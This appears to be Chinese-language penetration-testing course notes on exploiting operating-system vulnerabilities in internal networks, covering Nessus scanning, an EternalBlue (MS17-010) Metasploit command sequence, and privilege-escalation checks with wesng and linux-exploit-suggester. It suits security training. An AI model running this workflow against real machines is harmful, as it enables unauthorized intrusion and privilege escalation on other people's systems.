操作系统漏洞利用主要在内网——年久失修的机器才会有历史漏洞，外网基本不存在系统级老洞。两类：远程漏洞（未登录，系统外部直接打）和本地漏洞（已登进系统，用来提权）。这讲全是工具流，不深究漏洞原理

## 远程漏扫

**Nessus**（最流行，75000+ 组织在用）：

```
docker run -d --name nessus --restart=always -p 8834:8834 tenableofficial/nessus
```

访问 `https://localhost:8834`（注意 https；docker 搭建坑多，建议本地装）。高级扫描填目标 IP 即可，结果看 Vulnerabilities 页扇形图，重点只看 High/Critical。系统漏洞基本出在 Windows 上（Linux 难扫到）。扫出 MS17-010（永恒之蓝）这类就直接 MSF 打：

```
msfconsole
use windows/smb/ms17_010_eternalblue
set rhosts 目标IP
run
```

## 本地提权检测

**Windows**：

- 极光无限（https://detect.secwx.com/ ，替代已关闭的 hacking8）：选系统类型（支持 Win/CentOS/Ubuntu/RedHat）→ 在目标机执行它给的收集命令 → 粘贴输出 → 列出可能存在的提权漏洞 → 挑最近的搜 EXP 打
- wesng（https://github.com/bitsadmin/wesng ）：

```
pip install wesng
python wes.py --update
目标机 systeminfo > 1.txt
python wes.py 1.txt -o vulns.csv
```

筛选说明为 `Elevation of Privilege` 的条目。注意误报多、漏洞有重复，结果要自己筛

**Linux**：linux-exploit-suggester，文件传到目标机直接跑，列出可能的提权漏洞逐个试

## EXP 查找

拿到漏洞编号后去 https://github.com/1nnocent1/PoC-in-GitHub 直接搜（GitHub PoC 自动收集仓库），搜到 EXP 逐个试

## 要点

流程就是：远程 Nessus/Goby 扫 → 高危漏洞 MSF/PoC 打 → 拿到普通权限 → 极光无限/wesng/Suggester 比对补丁 → 搜 EXP 提权
